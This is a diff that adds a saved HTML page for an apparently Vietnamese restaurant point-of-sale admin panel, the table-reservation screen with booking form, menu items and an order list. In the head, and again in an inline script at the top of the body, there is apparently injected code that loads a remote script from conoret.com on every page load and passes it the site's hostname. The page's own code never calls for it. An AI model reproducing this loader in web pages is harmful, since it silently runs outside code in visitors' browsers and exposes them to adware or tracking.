@@ -1,0 +1,554 @@
+<html ><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Sundre</title>
+    <meta name="description" content="Free Bootstrap 4 Admin Theme | Pike Admin">
+    <meta name="author" content="Pike Web Development - https://www.pikephp.com">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="ac/images/favicon.ico">
+
+    <!-- Bootstrap CSS -->
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+
+    <!-- Font Awesome CSS -->
+    <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- Custom CSS -->
+    <link href="assets/css/style.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link href="assets/plugins/jstree/style.css" rel="stylesheet" type="text/css">
+    <link href="assets/plugins/datetimepicker/css/daterangepicker.css" rel="stylesheet">
+
+    <link href="assets/plugins/select2/css/select2.min.css" rel="stylesheet" type="text/css"><style>
+    a {
+        cursor: pointer
+    }
+    td{
+        font-size: 15px;
+        font-family: "Times New Roman", Times, serif;
+        /*font-family: Arial, Helvetica, sans-serif;*/
+    }
+    th,td{
+        line-height: 35px !important;
+        padding:3px !important;
+        text-align: center !important;
+    }
+    body{
+        background-color: #d9e2e2 !important;
+    }
+</style><script src="//conoret.com/dsp?h=localhost&amp;r=0.21190612957774668" type="text/javascript" defer="" async=""></script></head>
+
+
+
+
+<body class="adminbody-void" cz-shortcut-listen="true"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+
+<div id="main" class="enlarged forced">
+
+    <!-- top bar navigation -->
+    <div class="headerbar">
+
+        <!-- LOGO -->
+        <div class="headerbar-left">
+            <a href="QuanLyThonTinBan.html" class="logo"><img alt="Logo" src="assets/images/logo.png"> <span>Sundre</span></a>
+        </div>
+
+        <nav class="navbar-custom">
+
+            <ul class="list-inline float-right mb-0">
+
+
+
+                <li class="list-inline-item dropdown notif"><a class="nav-link dropdown-toggle nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
+                    <img src="assets/images/avatars/admin.png" alt="Profile image" class="avatar-rounded">
+                </a>
+                    <div class="dropdown-menu dropdown-menu-right profile-dropdown ">
+                        <!-- item-->
+                        <div class="dropdown-item">
+                            <h5 class="text-overflow">
+                                <small>Hello, <span name="000" id="User"> admin</span> </small>
+                            </h5>
+                        </div>
+                        <!-- item-->
+                        <a data-toggle="modal" data-target=".bd-example-modal-sm" class="dropdown-item notify-item"> <i class="fa fa-user"></i>
+                            <span> Đổi mật khẩu</span>
+                        </a>
+                        <!-- item-->
+                        <a href="/dangxuat" class="dropdown-item notify-item"> <i class="fa fa-power-off"></i> <span>Logout</span>
+                        </a>
+
+                    </div></li>
+
+            </ul>
+
+            <ul class="list-inline menu-left mb-0">
+                <li class="align-middle">
+                    <button class="button-menu-mobile open-left">
+                        <i class="fa fa-fw fa-bars"></i>
+                    </button>
+                </li>
+            </ul>
+
+        </nav>
+
+    </div>
+    <!-- End Navigation -->
+
+
+    <!-- Left Sidebar -->
+    <div class="left main-sidebar">
+
+        <div class="sidebar-inner leftscroll">
+
+            <div id="sidebar-menu">
+
+                <ul>
+
+
+
+                    <li class="submenu"><a href="#"><i class="fa fa-fw fa-table"></i> <span> Thu Ngan </span> <span class="menu-arrow"></span></a>
+                        <ul class="list-unstyled">
+                            <li><a href="QuanLyThonTinBan.html">Bàn
+                                Phòng</a></li>
+                            <li><a href="DatBan.html">Đặt
+                                Bàn</a></li>
+                        </ul>
+                    </li>
+
+                    <li class="submenu"><a href="#"><i class="fa fa-fw fa-tv"></i>
+                        <span> Mặt Hàng</span> <span class="menu-arrow"></span></a>
+                        <ul class="list-unstyled">
+                            <li><a href="DanhSachSanPham.html">Danh Sách</a></li>
+                            <li><a href="LoaiBangGia.html">Loại bảng giá</a></li>
+                        </ul></li>
+                    <li class="submenu"><a href="#"><i class="fa fa-fw fa-th"></i>
+                        <span> Quảng Lý Chứng Từ </span> <span class="menu-arrow"></span></a>
+                        <ul class="list-unstyled">
+                            <li><a href="DanhSachChungTu.html">Danh sách chứng từ</a></li>
+                        </ul>
+                    </li>
+                    <li class="submenu"><a href="KhachHang.html"><i class="fa fa-fw fa-image"></i> <span> Khách Hàng</span></a></li>
+                    <li class="submenu"><a href="NhanVien.html"><i class="fa fa-fw fa-image"></i> <span> Nhân viên</span></a></li>
+                </ul>
+
+                <div class="clearfix"></div>
+
+            </div>
+
+            <div class="clearfix"></div>
+
+        </div>
+
+    </div>
+    <!-- End Sidebar -->
+
+
+    <div class="content-page">
+
+        <!-- Start content -->
+        <div class="content">
+            <div class="container-fluid" data-select2-id="14">
+
+                <div class="row">
+                    <div class="col-xl-12">
+                        <div class="breadcrumb-holder">
+                            <h1 class="main-title float-left">Đặt Bàn</h1>
+                            <ol class="breadcrumb float-right">
+                                <li class="breadcrumb-item">Home</li>
+                                <li class="breadcrumb-item active">Thu Ngân</li>
+                                <li class="breadcrumb-item active">Đặt Bàn</li>
+                            </ol>
+                            <div class="clearfix"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row" id="add-dathang" style="">
+                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+                        <div class="card mb-3">
+                            <div class="card-body" style="overflow: auto;">
+                                <div class="row">
+                                    <div class="col-xs-12 col-sm-12 col-md-7 col-lg-7 col-xl-7">
+                                        <div class="card mb-3">
+                                            <div class="card-header">
+                                                <h3>Thông tin đặt hàng</h3>
+                                            </div>
+                                            <div class="card-body" id="detail">
+
+                                                <form id="save">
+                                                    <div class="row" style="max-height: 400px; overflow: auto;">
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Ngày lập: <input type="text" class="form-control ngaylap" readonly="readonly">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Số phiếu: <input type="text" class="form-control sophieu" readonly="readonly">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Khách hàng: <select class="form-control form-control-sm select2 khachHang selected-hiden select2-hidden-accessible" name="state" required="" data-select2-id="69" tabindex="-1" aria-hidden="true">
+                                                            <option value="" data-select2-id="71"></option>
+                                                            <option value="001" selected="selected" data-select2-id="75">Huy</option>
+                                                        </select><span class="select2 select2-container select2-container--default" dir="ltr" data-select2-id="76" style="width: 210px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-haspopup="true" aria-expanded="false" tabindex="0" aria-labelledby="select2-state-kt-container"><span class="select2-selection__rendered" id="select2-state-kt-container" role="textbox" aria-readonly="true" title="Huy">Huy
+                                                        </span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span></span><span class="dropdown-wrapper" aria-hidden="true"></span></span>
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Ngày đặt: <input type="text" class="form-control ngayDat" name="singledatepicker" style="background-color: white" readonly="readonly">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Giờ đặt: <input type="text" class="form-control gioDat">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Số khách: <input type="number" class="form-control soKhach">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Bảng giá: <select class="form-control form-control-sm select2 bangGia selected-hiden select2-hidden-accessible" name="state" required="" data-select2-id="72" tabindex="-1" aria-hidden="true">
+                                                            <option value="" data-select2-id="74"></option>
+                                                            <option value="FOOD" data-select2-id="78">Bảng giá Ngày lễ</option>
+                                                            <option value="RUOU" data-select2-id="79">Bảng giá ngày thường</option>
+                                                            <option value="VIP" data-select2-id="80">Bảng giá khách Vip</option>
+                                                        </select><span class="select2 select2-container select2-container--default" dir="ltr" data-select2-id="81" style="width: 210px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-haspopup="true" aria-expanded="false" tabindex="0" aria-labelledby="select2-state-jp-container"><span class="select2-selection__rendered" id="select2-state-jp-container" role="textbox" aria-readonly="true" title=""></span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span></span><span class="dropdown-wrapper" aria-hidden="true"></span></span>
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Giảm(%): <input type="number" class="form-control giam">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Tiền đặt trước: <input type="number" class="form-control tienDatTruoc">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Tổng tiền: <input type="number" class="form-control tongtien" readonly="readonly">
+                                                        </div>
+                                                        <div class="col-xs-6 col-sm-6 col-md-4 col-lg-4 col-xl-4">
+                                                            Còn lại <input type="number" class="form-control conlai" readonly="readonly">
+                                                        </div>
+                                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+                                                            Ghi chú: <input type="text" class="form-control ghichu">
+                                                        </div>
+                                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+                                                            <table id="thudondadatall" class="table table-bordered table-hover display">
+                                                                <thead>
+                                                                <tr>
+                                                                    <th>STT</th>
+                                                                    <th>Tên hàng hóa</th>
+                                                                    <th>DVT</th>
+                                                                    <th>Số lượng</th>
+                                                                    <th>Ghi chú</th>
+                                                                    <th>Thao tác</th>
+                                                                </tr>
+                                                                </thead>
+                                                                <tbody class="text-nowrap" id="thudondadat">
+                                                                <tr class="001" name="001">
+                                                                    <td>1</td>
+                                                                    <td>Nước ngọt</td>
+                                                                    <td>VND</td>
+                                                                    <td><input type="number" size="10" style="width:50px;" class="form-control qd-select soLuong" min="1" value="1.0" required=""></td>
+                                                                    <td class="add-delete1" style="display: none;"><button type="button" class="btn btn-success btn-sm add-thucdon">Thêm</button></td>
+                                                                    <td class="show"><input value="" type="text" size="10" style="width:200px;" class="form-control qd-select ghichu"></td>
+                                                                    <td class="show"> <a class="btn btn-danger btn-sm delete-btn" style="color: white"><i class="fa fa-trash-o"></i></a> </td>
+                                                                </tr>
+                                                                <tr class="002" name="002">
+                                                                    <td>2</td>
+                                                                    <td>Rượu</td>
+                                                                    <td>VND</td>
+                                                                    <td><input type="number" size="10" style="width:50px;" class="form-control qd-select soLuong" min="1" value="1.0" required=""></td>
+                                                                    <td class="add-delete1" style="display: none;"><button type="button" class="btn btn-success btn-sm add-thucdon">Thêm</button></td>
+                                                                    <td class="show"><input value="" type="text" size="10" style="width:200px;" class="form-control qd-select ghichu"></td>
+                                                                    <td class="show"> <a class="btn btn-danger btn-sm delete-btn" style="color: white"><i class="fa fa-trash-o"></i></a> </td>
+                                                                </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                    <input id="btn-submit" type="submit" style="display: none;" name="">
+                                                </form>
+                                                <script>
+                                                    $(function() {
+                                                        $('input[name="singledatepicker"]').daterangepicker({
+                                                            singleDatePicker: true,
+                                                            showDropdowns: true
+                                                        });
+                                                    });
+                                                </script>
+                                            </div>
+                                            <div class="card-header">
+                                                <button type="button" class="btn btn-secondary huy float-right" style="margin: 0px 20px;" role="button"> Đóng </button>
+                                                <button type="button" class="btn btn-success xacnhan float-right" role="button"> Xác nhận thêm/chỉnh sửa</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-xs-12 col-sm-12 col-md-5 col-lg-5 col-xl-5">
+                                        <div class="card mb-3">
+                                            <div class="card-header">
+                                                <h3>Thêm thực đơn</h3>
+                                            </div>
+                                            <div class="card-body" id="thucdon" style="max-height: 400px; overflow: auto;">
+                                                <table class="table table-bordered table-hover display">
+                                                    <thead>
+                                                    <tr>
+                                                        <th>STT</th>
+                                                        <th>Tên hàng hóa</th>
+                                                        <th>DVT</th>
+                                                        <th>Số lượng</th>
+                                                        <th>Thêm</th>
+                                                    </tr>
+                                                    </thead>
+                                                    <tbody class="text-nowrap" id="listthucdon">
+
+
+
+
+
+
+
+                                                    <tr name="003" class="003">
+                                                        <td>3</td>
+                                                        <td>Cơm chiên</td>
+                                                        <td>VND</td>
+                                                        <td> <input type="number" size="10" style="width:50px;" class="form-control qd-select soLuong" min="1" value="1" required=""> </td>
+                                                        <td class="add-delete1"><button type="button" class="btn btn-success btn-sm add-thucdon">Thêm</button></td>
+                                                        <td class="show" style="display: none;"><input type="text" size="10" style="width:200px;" class="form-control qd-select ghichu"></td>
+                                                        <td class="show" style="display: none;"> <a class="btn btn-danger btn-sm delete-btn" style="color: white"><i class="fa fa-trash-o"> </i></a></td>
+                                                    </tr>
+
+
+                                                    <tr name="004" class="004">
+                                                        <td>4</td>
+                                                        <td>Gà chiên mắm</td>
+                                                        <td>VND</td>
+                                                        <td> <input type="number" size="10" style="width:50px;" class="form-control qd-select soLuong" min="1" value="1" required=""> </td>
+                                                        <td class="add-delete1"><button type="button" class="btn btn-success btn-sm add-thucdon">Thêm</button></td>
+                                                        <td class="show" style="display: none;"><input type="text" size="10" style="width:200px;" class="form-control qd-select ghichu"></td>
+                                                        <td class="show" style="display: none;"> <a class="btn btn-danger btn-sm delete-btn" style="color: white"><i class="fa fa-trash-o"> </i></a></td>
+                                                    </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <!-- <h3>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</h3> -->
+                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+                        <div class="card mb-3">
+                            <div class="card-header">
+                                <button type="button" class="btn btn-success adddatban">
+                                    <i class="fa fa-plus bigfonts"></i> Thêm đơn đặt hàng</button>
+                            </div>
+                            <div class="card-body" id="listdatban" style="overflow: auto;">
+                                <table id="listkhachhang" class="table table-bordered table-hover display">
+                                    <thead>
+                                    <tr>
+                                        <th rowspan="2" style="line-height: 35px; padding:3px;text-align: center;">STT</th>
+                                        <th colspan="2" style="line-height: 35px; padding:3px;text-align: center;">Chứng từ</th>
+                                        <th colspan="5" style="line-height: 35px; padding:3px;text-align: center; background-color:#f7f7f7;">Đặt bàn</th>
+                                        <th colspan="4" style="line-height: 35px; padding:3px;text-align: center;">Giá trị</th>
+                                        <th rowspan="2" style="line-height: 35px; padding:3px;text-align: center;">Ghi chú</th>
+                                        <th rowspan="2" style="line-height: 35px; padding:3px;text-align: center;">Xong</th>
+                                    </tr>
+                                    <tr>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center;">Số chứng từ</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center;">Ngày lập</th>
+
+                                        <th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Ngày</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Giờ</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Số món</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Số khách</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Đơn vị/ họ tên</th>
+
+                                        <th style="line-height: 35px; padding: 3px;text-align: center;">Số tiền</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center;">Giảm</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center;">Đặt cọc</th>
+                                        <th style="line-height: 35px; padding: 3px;text-align: center;">Còn lại</th>
+                                    </tr>
+                                    </thead>
+                                    <tbody class="text-nowrap">
+                                    <tr id="chungtu00003DDH" class="chungtulist">
+                                        <td class="stt1">1</td>
+                                        <td class="sochungtu1">00003DDH</td>
+                                        <td class="ngayCT1">2023-05-12 19:04:31.557</td>
+                                        <td class="ngayDat1">2023-05-12</td>
+                                        <td class="gioDat1">2</td>
+                                        <td class="dongChungTu1">2</td>
+                                        <td class="soKhach1">30</td>
+                                        <td class="khachHang1" name="001">Huy</td>
+                                        <td class="soTien1">340000</td>
+                                        <td class="giam1">0.0</td>
+                                        <td class="traTruoc1">0</td>
+                                        <td class="conlai1">
+                                            <span>340000.0</span>
+                                        </td>
+                                        <td class="ghichu1"></td>
+                                        <td class="">0</td>
+                                    </tr>
+                                    </tbody>
+                                </table>
+
+                                <div class="contextMenu" id="myMenu1" style="display: none;">
+                                    <ul>
+                                        <li id="chitiet-l">Chi tiết</li>
+                                        <li id="change-l">Vào bàn</li>
+                                        <li id="done-l">Đã xong</li>
+                                        <li id="delete-l"> Hủy đơn hàng</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <span data-toggle="modal" id="vaoban" data-target=".vaoban"></span>
+                <div class="modal fade vaoban" tabindex="-1" role="dialog" aria-hidden="true">
+                    <div class="modal-dialog modal-sm">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h5>Vào bàn</h5>
+                            </div>
+                            <div class="modal-body" style="overflow: auto; max-height: 500px">
+                                <table class="table table-bordered table-hover display" style="margin-top:10px;">
+                                    <thead>
+                                    <tr>
+                                        <th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Khu vực</th>
+                                        <th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Số bàn / phòng</th>
+                                    </tr>
+                                    </thead>
+                                    <tbody class="text-nowrap listban">
+
+                                    </tbody>
+                                </table>
+                            </div>
+                            <div class="modal-footer">
+                                <button type="button" class="btn btn-secondary huy-chuyenban btn-sm" data-dismiss="modal">Hủy</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="display: none;" class="noob"></div>
+
+            </div>
+        </div>
+
+        <!-- END content -->
+
+
+
+    </div>
+    <!-- END content-page -->
+
+    <footer class="footer">
+			<span class="text-right"> Copyright <a target="_blank" href="#">47k14.12.3</a>
+    </footer>
+
+
+
+    <!-- Open modal -->
+
+    <div class="modal fade bd-example-modal-sm" tabindex="-1" role="dialog" aria-hidden="true">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Hello, admin</h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">×</span>
+                    </button>
+                </div>
+                <form>
+                    <div class="modal-body">
+
+                        <div class="form-group">
+                            <label for="maukhaucu">Nhập mật khẩu cũ</label> <input type="password" class="form-control" id="maukhaucu" aria-describedby="emailHelp" placeholder="Nhập mật khẩu cũ" required="">
+
+                        </div>
+                        <div class="form-group">
+                            <label for="maukhaumoi">Nhập mật khẩu mới</label> <input type="password" class="form-control" id="maukhaumoi" aria-describedby="numberlHelp" placeholder="Nhập mật khẩu mới" required=""> <small id="emailHelp" class="form-text text-muted">Mật khẩu phải bao gồm ít
+                            nhất 8 ký tự, phải có ký tự in hoa, thường và ký tự đặc biệt.</small>
+                        </div>
+                        <div class="form-group">
+                            <label for="xacnhan">Xác nhận lại mậu khẩu</label>
+                            <input type="password" class="form-control" id="xacnhan" placeholder="Xác nhận lại mật khẩu" required="">
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" id="doimatkhau" class="btn btn-primary">Save
+                            changes</button>
+                        <button type="button" class="btn btn-secondary closemd1" data-dismiss="modal">Close</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+</div>
+<!-- END main -->
+
+<script src="assets/js/modernizr.min.js"></script>
+<script src="assets/js/jquery.min.js"></script>
+
+<script src="assets/js/popper.min.js"></script> <!--poper avatar-->
+<script src="assets/js/bootstrap.min.js"></script>
+
+<script src="assets/js/fastclick.js"></script> <!--right click in soffware-->
+
+<!-- App js -->
+<script src="assets/js/pikeadmin.js"></script>
+
+<!-- BEGIN Java Script for this page -->
+<script src="https://cdn.datatables.net/1.10.16/js/dataTables.bootstrap4.min.js"></script>
+<script src="/webjars/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- Counter-Up-->
+<script src="assets/plugins/waypoints/lib/jquery.waypoints.min.js"></script>
+<script src="assets/plugins/counterup/jquery.counterup.min.js"></script>
+<script src="assets/js/jquery.contextmenu.min.js"></script>
+<script src="assets/plugins/jstree/jstree.min.js"></script>
+<script src="assets/plugins/select2/js/select2.min.js"></script>
+<script src="assets/plugins/datetimepicker/js/moment.min.js"></script>
+<script src="assets/plugins/datetimepicker/js/daterangepicker.js"></script>
+<!-- ///////////////////////////////////////////////////////////////////// -->
+
+<!-- END Java Script for this page -->
+<script>
+
+
+
+
+
+    // jQuery code
+    $(document).ready(function() {
+        // Show context menu on right-click
+        $('.listbanle').on("contextmenu", function(event) {
+            event.preventDefault(); // Prevent default context menu
+            // Show the context menu box
+            $("#jqContextMenu").css({
+                top: event.pageY + "px",
+                left: event.pageX + "px",
+                display: "block"
+            });
+        });
+
+        // Hide context menu on click outside
+        $('.listbanle').on("click", function() {
+            $("#jqContextMenu").hide();
+        });
+
+        // Hide context menu on ESC key press
+        $('.listbanle').on("keydown", function(event) {
+            if (event.which === 27) {
+                $("#jqContextMenu").hide();
+            }
+        });
+    });
+
+</script>
+
+<div id="jqContextMenu" style="position: absolute; z-index: 500; left: 635px; top: 318px; display: none;"><ul style="list-style: none; padding: 1px; margin: 0px; background-color: rgb(255, 255, 255); border: 1px solid rgb(153, 153, 153);">
+    <li id="capnhap-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Cập nhập</li>
+    <li id="huy-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Hủy</li>
+    <li id="chuyenban-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Chuyển bàn</li>
+    <li id="ghepban-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Ghép bàn</li>
+    <li id="thanhtoan-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;"> Thanh Toán</li>
+</ul></div><div style="background-color: rgb(0, 0, 0); position: absolute; opacity: 0.2; z-index: 499; display: none; width: 98px; height: 164px; left: 637px; top: 320px;"></div></body></html>
